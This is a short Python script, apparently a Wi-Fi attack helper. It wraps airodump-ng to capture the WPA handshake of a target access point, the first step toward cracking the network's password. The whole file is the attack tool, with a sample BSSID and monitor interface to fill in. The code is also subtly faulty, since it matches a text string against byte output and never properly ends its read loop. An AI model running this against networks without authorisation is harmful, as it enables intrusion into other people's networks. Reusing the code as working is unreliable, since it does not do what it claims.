import subprocess
import os
import time

class HandshakeCapturer:
    def __init__(self, bssid, channel, interface, output_prefix="capture1"):
        
        self.bssid = bssid
        self.channel = channel
        self.interface = interface
        self.output_prefix = output_prefix
        self.cap_file = f"{output_prefix}.cap"
        self.process = None

    def start_airodump(self):
        """
        Start the airodump-ng process and monitor for handshake.
        """
        print(f"[*] Starting airodump-ng on channel {self.channel} for BSSID {self.bssid}...")
        cmd = [
            "airodump-ng",
            "-w", self.output_prefix,
            "-c", str(self.channel),
            "--bssid", self.bssid,
            self.interface
        ]
        self.process = subprocess.Popen(cmd, stdout=subprocess.PIPE, stderr=subprocess.PIPE)
        print("[*] Airodump-ng started. Waiting for handshake...")

        for line in iter(self.process.stdout.readline, ''):
            # Check if the line indicates a handshake
            if "WPA handshake:" in line:
                print("Handshake captured!")
                break

        self.stop_airodump()

    def stop_airodump(self):
        # Stop the airodump-ng process.
        if self.process:
            print("[*] Stopping airodump-ng...")
            self.process.terminate()
            self.process.wait()
            self.process = None
            print("[*] Airodump-ng stopped.")

# Example Usage
if __name__ == "__main__":
    # Replace these with your values
    BSSID = "DC:D9:AE:15:DB:19"
    CHANNEL = 5
    INTERFACE = "wlan0mon"

    capturer = HandshakeCapturer(BSSID, CHANNEL, INTERFACE)
    capturer.start_airodump()
